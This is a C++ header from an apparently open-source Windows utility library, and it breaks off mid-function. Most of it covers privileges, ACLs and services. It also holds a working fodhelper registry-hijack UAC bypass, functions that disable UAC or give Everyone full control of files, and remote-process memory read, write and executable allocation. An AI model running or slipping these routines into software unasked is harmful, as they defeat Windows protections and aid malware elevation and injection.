/*
 * ============================================================================
 * WinPower.hpp
 * Part of the WinUtils project — Low-level Windows power utilities
 * ============================================================================
 *
 * Copyright (c) 2026 RedMeansWar
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to
 * deal in the Software without restriction, including without limitation the
 * rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
 * sell copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 * IN THE SOFTWARE.
 *
 * ============================================================================
 *
 * WARNING — ELEVATED PRIVILEGES AND SYSTEM-LEVEL ACCESS.
 * USE AT YOUR OWN RISK.
 *
 * This file contains utilities that operate at the Windows security boundary,
 * including ACL manipulation, UAC bypass techniques, service control, process
 * memory access, anti-debug mechanisms, and DLL injection.
 *
 * Most functions require Administrator privileges. Several techniques used
 * here overlap with those employed by security research tools and, in misuse
 * scenarios, malware. You are solely responsible for ensuring your use is
 * lawful and that you have explicit authorization for any system you operate
 * on. Misuse against systems you do not own is illegal in most jurisdictions.
 *
 * Some functions in this file will be flagged by antivirus and EDR products.
 * This is expected behaviour — the detections are based on technique, not
 * intent. Use in a test environment or with appropriate AV exclusions.
 *
 * The author accepts no responsibility for damages, data loss, system failure,
 * legal consequences, or any other outcome arising from the use or misuse of
 * this software.
 *
 * ============================================================================
 *
 * Requires : Windows (Win32 API), C++17 or later, WinUtils.hpp
 * Reference: See README.md for full namespace and function documentation
 *
 * ============================================================================
*/


#pragma once
#ifndef WIN_POWER_HPP
#define WIN_POWER_HPP

#ifndef WIN_UTILS_HPP
// ! WinPower.hpp requires WinUtils.hpp — #include "WinUtils.hpp" first.
// ! This is to avoid circular dependencies, as WinUtils.hpp contains some basic utilities
// ! that WinPower.hpp relies on. Please include WinUtils.hpp before including this file.
#include "WinUtils.hpp"
#endif

#include <winternl.h>
#include <processthreadsapi.h>
#include <synchapi.h>

// Define missing process access constants if not already defined
#ifndef PROCESS_SYNCHRONIZE
#define PROCESS_SYNCHRONIZE 0x00100000
#endif
#include <comdef.h>
#include <wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

namespace WinUtils {

// ============================================================
//  SECTION P1 — Ownership & Privilege
// ============================================================
//  Modify file/registry ACLs and token privileges.
//  Requires SeRestorePrivilege, SeBackupPrivilege, Admin.
//  !! Misuse can break system files or make Windows unbootable !!
// ============================================================
namespace Ownership {

    /// Enable a named privilege in the current process token.
    inline bool _EnablePrivilege(LPCWSTR name) {
        HANDLE hToken = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        if (!LookupPrivilegeValueW(nullptr, name, &tp.Privileges[0].Luid)) {
            CloseHandle(hToken); return false;
        }
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        bool ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)
                  && GetLastError() == ERROR_SUCCESS;
        CloseHandle(hToken);
        return ok;
    }

    /// Enable all privileges commonly needed for ownership/ACL work
    inline bool EnableOwnershipPrivileges() {
        bool ok = true;
        ok &= _EnablePrivilege(SE_TAKE_OWNERSHIP_NAME);
        ok &= _EnablePrivilege(SE_RESTORE_NAME);
        ok &= _EnablePrivilege(SE_BACKUP_NAME);
        ok &= _EnablePrivilege(SE_SECURITY_NAME);
        return ok;
    }

    /// Take ownership of a file or directory, setting owner to current user.
    /// !! DANGEROUS on system files — can break Windows !!
    inline bool TakeOwnershipFile(const std::string& path) {
        _EnablePrivilege(SE_TAKE_OWNERSHIP_NAME);
        _EnablePrivilege(SE_RESTORE_NAME);
        HANDLE hToken = nullptr;
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
        DWORD sz = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &sz);
        std::vector<BYTE> buf(sz);
        GetTokenInformation(hToken, TokenUser, buf.data(), sz, &sz);
        CloseHandle(hToken);
        PSID pSid = reinterpret_cast<TOKEN_USER*>(buf.data())->User.Sid;
        PSECURITY_DESCRIPTOR pSD = LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
        InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
        SetSecurityDescriptorOwner(pSD, pSid, FALSE);
        bool ok = SetFileSecurityW(Str::ToWide(path).c_str(), OWNER_SECURITY_INFORMATION, pSD) != FALSE;
        LocalFree(pSD);
        return ok;
    }

    /// Grant full control on a file/directory to the current user.
    /// !! DANGEROUS on system files !!
    inline bool GrantFullControlFile(const std::string& path) {
        _EnablePrivilege(SE_SECURITY_NAME);
        _EnablePrivilege(SE_RESTORE_NAME);
        HANDLE hToken = nullptr;
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
        DWORD sz = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &sz);
        std::vector<BYTE> buf(sz);
        GetTokenInformation(hToken, TokenUser, buf.data(), sz, &sz);
        CloseHandle(hToken);
        PSID pSid = reinterpret_cast<TOKEN_USER*>(buf.data())->User.Sid;
        EXPLICIT_ACCESSW ea{};
        ea.grfAccessPermissions = GENERIC_ALL;
        ea.grfAccessMode        = SET_ACCESS;
        ea.grfInheritance       = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
        ea.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
        ea.Trustee.TrusteeType  = TRUSTEE_IS_USER;
        ea.Trustee.ptstrName    = static_cast<LPWSTR>(static_cast<void*>(pSid));
        PACL pOldDacl = nullptr, pNewDacl = nullptr;
        PSECURITY_DESCRIPTOR pSD = nullptr;
        GetNamedSecurityInfoW(Str::ToWide(path).c_str(), SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION, nullptr, nullptr, &pOldDacl, nullptr, &pSD);
        SetEntriesInAclW(1, &ea, pOldDacl, &pNewDacl);
        bool ok = SetNamedSecurityInfoW(
            const_cast<LPWSTR>(Str::ToWide(path).c_str()),
            SE_FILE_OBJECT, DACL_SECURITY_INFORMATION,
            nullptr, nullptr, pNewDacl, nullptr) == ERROR_SUCCESS;
        if (pSD)     LocalFree(pSD);
        if (pNewDacl) LocalFree(pNewDacl);
        return ok;
    }

    /// Give Everyone full access to a file. !! VERY DANGEROUS on system paths !!
    inline bool UnlockFileForEveryone(const std::string& path) {
        _EnablePrivilege(SE_SECURITY_NAME);
        SID_IDENTIFIER_AUTHORITY worldAuth = SECURITY_WORLD_SID_AUTHORITY;
        PSID pSid = nullptr;
        AllocateAndInitializeSid(&worldAuth, 1, SECURITY_WORLD_RID, 0,0,0,0,0,0,0, &pSid);
        EXPLICIT_ACCESSW ea{};
        ea.grfAccessPermissions = GENERIC_ALL;
        ea.grfAccessMode        = SET_ACCESS;
        ea.grfInheritance       = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
        ea.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
        ea.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
        ea.Trustee.ptstrName    = static_cast<LPWSTR>(static_cast<void*>(pSid));
        PACL pNewDacl = nullptr;
        SetEntriesInAclW(1, &ea, nullptr, &pNewDacl);
        bool ok = SetNamedSecurityInfoW(
            const_cast<LPWSTR>(Str::ToWide(path).c_str()),
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
            nullptr, nullptr, pNewDacl, nullptr) == ERROR_SUCCESS;
        if (pSid)    FreeSid(pSid);
        if (pNewDacl) LocalFree(pNewDacl);
        return ok;
    }

    /// Get the owner of a file as "DOMAIN\\User"
    inline std::string GetFileOwner(const std::string& path) {
        PSECURITY_DESCRIPTOR pSD = nullptr;
        PSID pSid = nullptr; BOOL defaulted = FALSE;
        if (GetNamedSecurityInfoW(Str::ToWide(path).c_str(), SE_FILE_OBJECT,
            OWNER_SECURITY_INFORMATION, &pSid, nullptr, nullptr, nullptr, &pSD) != ERROR_SUCCESS)
            return {};
        wchar_t name[256]={}, domain[256]={};
        DWORD ns=256, ds=256; SID_NAME_USE use;
        LookupAccountSidW(nullptr, pSid, name, &ns, domain, &ds, &use);
        LocalFree(pSD);
        return Str::ToNarrow(domain) + "\\" + Str::ToNarrow(name);
    }

    inline bool CanWrite(const std::string& path) { return _access(path.c_str(), 2) == 0; }
    inline bool CanRead(const std::string& path)  { return _access(path.c_str(), 4) == 0; }

    /// Take ownership of a registry key. !! DANGEROUS on system keys !!
    inline bool TakeOwnershipKey(HKEY root, const std::string& subkey) {
        _EnablePrivilege(SE_TAKE_OWNERSHIP_NAME);
        _EnablePrivilege(SE_RESTORE_NAME);
        _EnablePrivilege(SE_BACKUP_NAME);
        HANDLE hToken = nullptr;
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
        DWORD sz = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &sz);
        std::vector<BYTE> buf(sz);
        GetTokenInformation(hToken, TokenUser, buf.data(), sz, &sz);
        CloseHandle(hToken);
        PSID pSid = reinterpret_cast<TOKEN_USER*>(buf.data())->User.Sid;
        HKEY hk = nullptr;
        if (RegOpenKeyExW(root, Str::ToWide(subkey).c_str(), 0,
            WRITE_OWNER | READ_CONTROL, &hk) != ERROR_SUCCESS) return false;
        PSECURITY_DESCRIPTOR pSD = LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
        InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
        SetSecurityDescriptorOwner(pSD, pSid, FALSE);
        bool ok = RegSetKeySecurity(hk, OWNER_SECURITY_INFORMATION, pSD) == ERROR_SUCCESS;
        LocalFree(pSD); RegCloseKey(hk);
        return ok;
    }

    /// Grant full control on a registry key to the current user. !! DANGEROUS !!
    inline bool GrantFullControlKey(HKEY root, const std::string& subkey) {
        _EnablePrivilege(SE_SECURITY_NAME);
        std::string rootName;
        if      (root == HKEY_LOCAL_MACHINE)  rootName = "MACHINE";
        else if (root == HKEY_CURRENT_USER)   rootName = "CURRENT_USER";
        else if (root == HKEY_CLASSES_ROOT)   rootName = "CLASSES_ROOT";
        else if (root == HKEY_USERS)          rootName = "USERS";
        else return false;
        std::string fullKey = rootName + "\\" + subkey;
        HANDLE hToken = nullptr;
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
        DWORD sz = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &sz);
        std::vector<BYTE> buf(sz);
        GetTokenInformation(hToken, TokenUser, buf.data(), sz, &sz);
        CloseHandle(hToken);
        PSID pSid = reinterpret_cast<TOKEN_USER*>(buf.data())->User.Sid;
        EXPLICIT_ACCESSW ea{};
        ea.grfAccessPermissions = KEY_ALL_ACCESS;
        ea.grfAccessMode        = SET_ACCESS;
        ea.grfInheritance       = CONTAINER_INHERIT_ACE;
        ea.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
        ea.Trustee.TrusteeType  = TRUSTEE_IS_USER;
        ea.Trustee.ptstrName    = static_cast<LPWSTR>(static_cast<void*>(pSid));
        PACL pOldDacl=nullptr, pNewDacl=nullptr;
        PSECURITY_DESCRIPTOR pSD=nullptr;
        GetNamedSecurityInfoW(Str::ToWide(fullKey).c_str(), SE_REGISTRY_KEY,
            DACL_SECURITY_INFORMATION, nullptr, nullptr, &pOldDacl, nullptr, &pSD);
        SetEntriesInAclW(1, &ea, pOldDacl, &pNewDacl);
        bool ok = SetNamedSecurityInfoW(
            const_cast<LPWSTR>(Str::ToWide(fullKey).c_str()),
            SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION,
            nullptr, nullptr, pNewDacl, nullptr) == ERROR_SUCCESS;
        if (pSD)      LocalFree(pSD);
        if (pNewDacl) LocalFree(pNewDacl);
        return ok;
    }

    /// List all privileges in the current token: name -> enabled
    inline std::map<std::string,bool> ListPrivileges() {
        std::map<std::string,bool> result;
        HANDLE hToken = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return result;
        DWORD sz = 0;
        GetTokenInformation(hToken, TokenPrivileges, nullptr, 0, &sz);
        std::vector<BYTE> buf(sz);
        GetTokenInformation(hToken, TokenPrivileges, buf.data(), sz, &sz);
        CloseHandle(hToken);
        auto* tp = reinterpret_cast<TOKEN_PRIVILEGES*>(buf.data());
        for (DWORD i = 0; i < tp->PrivilegeCount; ++i) {
            wchar_t name[256]={}; DWORD ns=256;
            LookupPrivilegeNameW(nullptr, &tp->Privileges[i].Luid, name, &ns);
            result[Str::ToNarrow(name)] = (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) != 0;
        }
        return result;
    }

    inline bool EnablePrivilege(const std::string& name)  { return _EnablePrivilege(Str::ToWide(name).c_str()); }

    inline bool DisablePrivilege(const std::string& name) {
        HANDLE hToken = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)) return false;
        TOKEN_PRIVILEGES tp{}; tp.PrivilegeCount = 1;
        LookupPrivilegeValueW(nullptr, Str::ToWide(name).c_str(), &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = 0;
        bool ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr) != FALSE;
        CloseHandle(hToken); return ok;
    }

    inline bool HasPrivilege(const std::string& name) {
        auto p = ListPrivileges(); auto it = p.find(name);
        return it != p.end() && it->second;
    }

    enum class IntegrityLevel { Untrusted, Low, Medium, MediumPlus, High, System, Unknown };

    inline IntegrityLevel GetIntegrityLevel() {
        HANDLE hToken = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return IntegrityLevel::Unknown;
        DWORD sz = 0;
        GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &sz);
        std::vector<BYTE> buf(sz);
        GetTokenInformation(hToken, TokenIntegrityLevel, buf.data(), sz, &sz);
        CloseHandle(hToken);
        auto* til = reinterpret_cast<TOKEN_MANDATORY_LABEL*>(buf.data());
        DWORD rid = *GetSidSubAuthority(til->Label.Sid,
            static_cast<DWORD>(*GetSidSubAuthorityCount(til->Label.Sid) - 1));
        if (rid < SECURITY_MANDATORY_LOW_RID)         return IntegrityLevel::Untrusted;
        if (rid < SECURITY_MANDATORY_MEDIUM_RID)      return IntegrityLevel::Low;
        if (rid < SECURITY_MANDATORY_MEDIUM_PLUS_RID) return IntegrityLevel::Medium;
        if (rid < SECURITY_MANDATORY_HIGH_RID)        return IntegrityLevel::MediumPlus;
        if (rid < SECURITY_MANDATORY_SYSTEM_RID)      return IntegrityLevel::High;
        return IntegrityLevel::System;
    }

    inline std::string GetIntegrityLevelStr() {
        switch (GetIntegrityLevel()) {
            case IntegrityLevel::Untrusted:  return "Untrusted";
            case IntegrityLevel::Low:        return "Low";
            case IntegrityLevel::Medium:     return "Medium";
            case IntegrityLevel::MediumPlus: return "Medium+";
            case IntegrityLevel::High:       return "High";
            case IntegrityLevel::System:     return "System";
            default:                         return "Unknown";
        }
    }

    inline bool IsElevated() {
        auto il = GetIntegrityLevel();
        return il == IntegrityLevel::High || il == IntegrityLevel::System;
    }

} // namespace Ownership

// ============================================================
//  SECTION P2 — Admin / UAC / Elevation
// ============================================================
namespace Admin {

    inline bool IsRunningAsAdmin() {
        BOOL isAdmin = FALSE;
        PSID adminGroup = nullptr;
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        if (AllocateAndInitializeSid(&ntAuth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0,0,0,0,0,0, &adminGroup)) {
            CheckTokenMembership(nullptr, adminGroup, &isAdmin);
            FreeSid(adminGroup);
        }
        return isAdmin != FALSE;
    }

    /// Relaunch as admin via UAC prompt, exits current non-elevated process
    inline void ForceRunAsAdmin() {
        if (IsRunningAsAdmin()) return;
        wchar_t exe[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, exe, MAX_PATH);
        LPWSTR cmdLine = GetCommandLineW();
        SHELLEXECUTEINFOW sei{};
        sei.cbSize=sizeof(sei); sei.lpVerb=L"runas";
        sei.lpFile=exe; sei.lpParameters=cmdLine; sei.nShow=SW_SHOWNORMAL;
        if (ShellExecuteExW(&sei)) ExitProcess(0);
    }

    inline bool RelaunchElevated(const std::string& args = "") {
        wchar_t exe[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, exe, MAX_PATH);
        std::wstring wargs = Str::ToWide(args);
        SHELLEXECUTEINFOW sei{};
        sei.cbSize=sizeof(sei); sei.lpVerb=L"runas";
        sei.lpFile=exe; sei.lpParameters=wargs.c_str(); sei.nShow=SW_SHOWNORMAL;
        return ShellExecuteExW(&sei) != FALSE;
    }

    inline bool RunElevated(const std::string& exe, const std::string& args="", bool wait=false) {
        std::wstring wexe=Str::ToWide(exe), wargs=Str::ToWide(args);
        SHELLEXECUTEINFOW sei{};
        sei.cbSize=sizeof(sei); sei.lpVerb=L"runas";
        sei.lpFile=wexe.c_str(); sei.lpParameters=wargs.c_str();
        sei.nShow=SW_SHOWNORMAL; sei.fMask=SEE_MASK_NOCLOSEPROCESS;
        if (!ShellExecuteExW(&sei)) return false;
        if (wait && sei.hProcess) { WaitForSingleObject(sei.hProcess,INFINITE); CloseHandle(sei.hProcess); }
        return true;
    }

    /// Disable UAC. !! DANGEROUS — requires Admin, takes effect after reboot !!
    inline bool DisableUAC() {
        return Registry::WriteDWORD(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0);
    }

    inline bool EnableUAC() {
        return Registry::WriteDWORD(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",1);
    }

    /// Set UAC level: 0=silent(!), 2=credential prompt, 5=default secure desktop
    inline bool SetUACLevel(DWORD level) {
        return Registry::WriteDWORD(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            "ConsentPromptBehaviorAdmin", level);
    }

    /// UAC bypass via fodhelper COM hijack — no prompt needed.
    /// !! RESEARCH/PERSONAL USE ONLY — flagged by most AV !!
    inline bool BypassUACComHijack(const std::string& exePath) {
        const std::string key  = "Software\\Classes\\ms-settings\\shell\\open\\command";
        const std::string dele = "Software\\Classes\\ms-settings";
        if (!Registry::WriteString(HKEY_CURRENT_USER, key, "", exePath)) return false;
        Registry::WriteString(HKEY_CURRENT_USER, key, "DelegateExecute", "");
        Process::Run("C:\\Windows\\System32\\fodhelper.exe","",false,false);
        ::Sleep(1500);
        Registry::DeleteKeyRecursive(HKEY_CURRENT_USER, dele);
        return true;
    }

    inline bool SetRequireAdminFlag(const std::string& exePath) {
        return Registry::WriteString(HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers",
            exePath, "~ RUNASADMIN");
    }

    inline bool ClearRequireAdminFlag(const std::string& exePath) {
        return Registry::DeleteValue(HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", exePath);
    }

} // namespace Admin

// ============================================================
//  SECTION P3 — Windows Services
// ============================================================
namespace Service {

    enum class ServiceState { Stopped,StartPending,StopPending,Running,
                              ContinuePending,PausePending,Paused,Unknown };

    inline ServiceState _StateFromDWORD(DWORD s) {
        switch(s) {
            case SERVICE_STOPPED:          return ServiceState::Stopped;
            case SERVICE_START_PENDING:    return ServiceState::StartPending;
            case SERVICE_STOP_PENDING:     return ServiceState::StopPending;
            case SERVICE_RUNNING:          return ServiceState::Running;
            case SERVICE_CONTINUE_PENDING: return ServiceState::ContinuePending;
            case SERVICE_PAUSE_PENDING:    return ServiceState::PausePending;
            case SERVICE_PAUSED:           return ServiceState::Paused;
            default:                       return ServiceState::Unknown;
        }
    }

    inline bool Exists(const std::string& n) {
        SC_HANDLE h=OpenSCManagerW(nullptr,nullptr,SC_MANAGER_CONNECT); if(!h) return false;
        SC_HANDLE s=OpenServiceW(h,Str::ToWide(n).c_str(),SERVICE_QUERY_STATUS);
        bool ok=s!=nullptr; if(s) CloseServiceHandle(s); CloseServiceHandle(h); return ok;
    }
    inline ServiceState GetState(const std::string& n) {
        SC_HANDLE h=OpenSCManagerW(nullptr,nullptr,SC_MANAGER_CONNECT); if(!h) return ServiceState::Unknown;
        SC_HANDLE s=OpenServiceW(h,Str::ToWide(n).c_str(),SERVICE_QUERY_STATUS);
        if(!s){CloseServiceHandle(h);return ServiceState::Unknown;}
        SERVICE_STATUS ss{}; QueryServiceStatus(s,&ss);
        CloseServiceHandle(s); CloseServiceHandle(h); return _StateFromDWORD(ss.dwCurrentState);
    }
    inline bool Start(const std::string& n) {
        SC_HANDLE h=OpenSCManagerW(nullptr,nullptr,SC_MANAGER_CONNECT); if(!h) return false;
        SC_HANDLE s=OpenServiceW(h,Str::ToWide(n).c_str(),SERVICE_START);
        bool ok=s&&StartServiceW(s,0,nullptr); if(s) CloseServiceHandle(s); CloseServiceHandle(h); return ok;
    }
    inline bool Stop(const std::string& n) {
        SC_HANDLE h=OpenSCManagerW(nullptr,nullptr,SC_MANAGER_CONNECT); if(!h) return false;
        SC_HANDLE s=OpenServiceW(h,Str::ToWide(n).c_str(),SERVICE_STOP);
        SERVICE_STATUS ss{}; bool ok=s&&ControlService(s,SERVICE_CONTROL_STOP,&ss);
        if(s) CloseServiceHandle(s); CloseServiceHandle(h); return ok;
    }
    inline bool Pause(const std::string& n) {
        SC_HANDLE h=OpenSCManagerW(nullptr,nullptr,SC_MANAGER_CONNECT); if(!h) return false;
        SC_HANDLE s=OpenServiceW(h,Str::ToWide(n).c_str(),SERVICE_PAUSE_CONTINUE);
        SERVICE_STATUS ss{}; bool ok=s&&ControlService(s,SERVICE_CONTROL_PAUSE,&ss);
        if(s) CloseServiceHandle(s); CloseServiceHandle(h); return ok;
    }
    inline bool Resume(const std::string& n) {
        SC_HANDLE h=OpenSCManagerW(nullptr,nullptr,SC_MANAGER_CONNECT); if(!h) return false;
        SC_HANDLE s=OpenServiceW(h,Str::ToWide(n).c_str(),SERVICE_PAUSE_CONTINUE);
        SERVICE_STATUS ss{}; bool ok=s&&ControlService(s,SERVICE_CONTROL_CONTINUE,&ss);
        if(s) CloseServiceHandle(s); CloseServiceHandle(h); return ok;
    }
    inline bool Install(const std::string& name, const std::string& displayName,
                        const std::string& exePath, DWORD startType=SERVICE_DEMAND_START) {
        SC_HANDLE h=OpenSCManagerW(nullptr,nullptr,SC_MANAGER_CREATE_SERVICE); if(!h) return false;
        std::wstring wn=Str::ToWide(name),wd=Str::ToWide(displayName),we=Str::ToWide(exePath);
        SC_HANDLE s=CreateServiceW(h,wn.c_str(),wd.c_str(),SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,startType,SERVICE_ERROR_NORMAL,
            we.c_str(),nullptr,nullptr,nullptr,nullptr,nullptr);
        bool ok=s!=nullptr; if(s) CloseServiceHandle(s); CloseServiceHandle(h); return ok;
    }
    inline bool Uninstall(const std::string& n) {
        SC_HANDLE h=OpenSCManagerW(nullptr,nullptr,SC_MANAGER_CONNECT); if(!h) return false;
        SC_HANDLE s=OpenServiceW(h,Str::ToWide(n).c_str(),DELETE);
        bool ok=s&&DeleteService(s); if(s) CloseServiceHandle(s); CloseServiceHandle(h); return ok;
    }
    inline bool SetStartType(const std::string& n, DWORD startType) {
        SC_HANDLE h=OpenSCManagerW(nullptr,nullptr,SC_MANAGER_CONNECT); if(!h) return false;
        SC_HANDLE s=OpenServiceW(h,Str::ToWide(n).c_str(),SERVICE_CHANGE_CONFIG);
        bool ok=s&&ChangeServiceConfigW(s,SERVICE_NO_CHANGE,startType,SERVICE_NO_CHANGE,
            nullptr,nullptr,nullptr,nullptr,nullptr,nullptr,nullptr);
        if(s) CloseServiceHandle(s); CloseServiceHandle(h); return ok;
    }
    inline bool InstallAndStart(const std::string& n, const std::string& d, const std::string& e) {
        return Install(n,d,e) && Start(n);
    }
    inline std::map<std::string,std::string> ListAll() {
        std::map<std::string,std::string> result;
        SC_HANDLE h=OpenSCManagerW(nullptr,nullptr,SC_MANAGER_ENUMERATE_SERVICE); if(!h) return result;
        DWORD needed=0,count=0,resume=0;
        EnumServicesStatusExW(h,SC_ENUM_PROCESS_INFO,SERVICE_WIN32,SERVICE_STATE_ALL,
            nullptr,0,&needed,&count,&resume,nullptr);
        std::vector<BYTE> buf(needed);
        if(EnumServicesStatusExW(h,SC_ENUM_PROCESS_INFO,SERVICE_WIN32,SERVICE_STATE_ALL,
            buf.data(),needed,&needed,&count,&resume,nullptr)) {
            auto* e=reinterpret_cast<ENUM_SERVICE_STATUS_PROCESSW*>(buf.data());
            for(DWORD i=0;i<count;++i)
                result[Str::ToNarrow(e[i].lpServiceName)]=Str::ToNarrow(e[i].lpDisplayName);
        }
        CloseServiceHandle(h); return result;
    }

} // namespace Service

// ============================================================
//  SECTION P4 — Process Memory
// ============================================================
//  Requires SeDebugPrivilege. May be flagged by AV/EDR.
//  Only use on processes you own or are authorized to modify.
// ============================================================
namespace Memory {

    inline bool Read(DWORD pid, uintptr_t addr, void* buf, size_t sz) {
        HANDLE h=OpenProcess(PROCESS_VM_READ,FALSE,pid); if(!h) return false;
        SIZE_T n=0; bool ok=ReadProcessMemory(h,reinterpret_cast<LPCVOID>(addr),buf,sz,&n)&&n==sz;
        CloseHandle(h); return ok;
    }
    inline bool Write(DWORD pid, uintptr_t addr, const void* buf, size_t sz) {
        HANDLE h=OpenProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION,FALSE,pid); if(!h) return false;
        SIZE_T n=0; bool ok=WriteProcessMemory(h,reinterpret_cast<LPVOID>(addr),buf,sz,&n)&&n==sz;
        CloseHandle(h); return ok;
    }
    template<typename T> inline std::optional<T> ReadT(DWORD pid, uintptr_t addr) {
        T v{}; if(!Read(pid,addr,&v,sizeof(T))) return std::nullopt; return v;
    }
    template<typename T> inline bool WriteT(DWORD pid, uintptr_t addr, const T& val) {
        return Write(pid,addr,&val,sizeof(T));
    }
    inline uintptr_t Alloc(DWORD pid, size_t sz, DWORD protect=PAGE_EXECUTE_READWRITE) {
        HANDLE h=OpenProcess(PROCESS_VM_OPERATION,FALSE,pid); if(!h) return 0;
        auto* p=VirtualAllocEx(h,nullptr,sz,MEM_COMMIT|MEM_RESERVE,protect);
        CloseHandle(h); return reinterpret_cast<uintptr_t>(p);
    }
    inline bool Free(DWORD pid, uintptr_t addr) {
        HANDLE h=OpenProcess(PROCESS_VM_OPERATION,FALSE,pid); if(!h) return false;
        bool ok=VirtualFreeEx(h,reinterpret_cast<LPVOID>(addr),0,MEM_RELEASE)!=FALSE;
        CloseHandle(h); return ok;
    }
    inline bool Protect(DWORD pid, uintptr_t addr, size_t sz, DWORD prot, DWORD* old=nullptr) {
        HANDLE h=OpenProcess(PROCESS_VM_OPERATION,FALSE,pid); if(!h) return false;
        DWORD o=0; bool ok=VirtualProtectEx(h,reinterpret_cast<LPVOID>(addr),sz,prot,&o)!=FALSE;
        if(old)*old=o; CloseHandle(h); return ok;
    }
    inline uintptr_t FindPattern(DWORD pid, uintptr_t start, size_t regionSz,
                                  const std::vector<BYTE>& pat, const std::vector<BYTE>& mask) {
        std::vector<BYTE> buf(regionSz);
        if(!Read(pid,start,buf.data(),regionSz)) return 0;
        for(size_t i=0;i+pat.size()<=regionSz;++i) {
            bool ok=true;
            for(size_t j=0;j<pat.size();++j) if(mask[j]&&buf[i+j]!=pat[j]){ok=false;break;}
            if(ok) return start+i;
        }
        return 0;
    }
    inline bool DumpRegion(DWORD pid, uintptr_t addr, size_t sz, const std::string& path) {
        std::vector<BYTE> buf(sz);
        if(!Read(pid,addr,buf.data(),sz)) return false;
        std::ofstream f(path,std::ios::binary); if(!f) return false;
        f.write(reinterpret_cast<char*>(buf.data()),buf.size()); return f.good();
    }
    inline uintptr_t GetModuleBase(DWORD pid, const std::string& modName) {
        HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32,pid);
        if(snap==INVALID_HANDLE_VALUE) return 0;
        MODULEENTRY32W me{sizeof(MODULEENTRY32W)};
        std::string low=modName; std::transform(low.begin(),low.end(),low.begin(),::tolower);
        uintptr_t base=0;
        if(Module32FirstW(snap,&me)) do {
            std::string mn=Str::ToNarrow(me.szModule);
            std::transform(mn.begin(),mn.end(),mn.begin(),::tolower);
            if(mn==low){base=reinterpret_cast<uintptr_t>(me.modBaseAddr);break;}
        } while(Module32NextW(snap,&me));
        CloseHandle(snap); return base;
    }
    inline std::vector<std::string> ListModules(DWORD pid) {
        std::vector<std::string> r;
        HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32,pid);
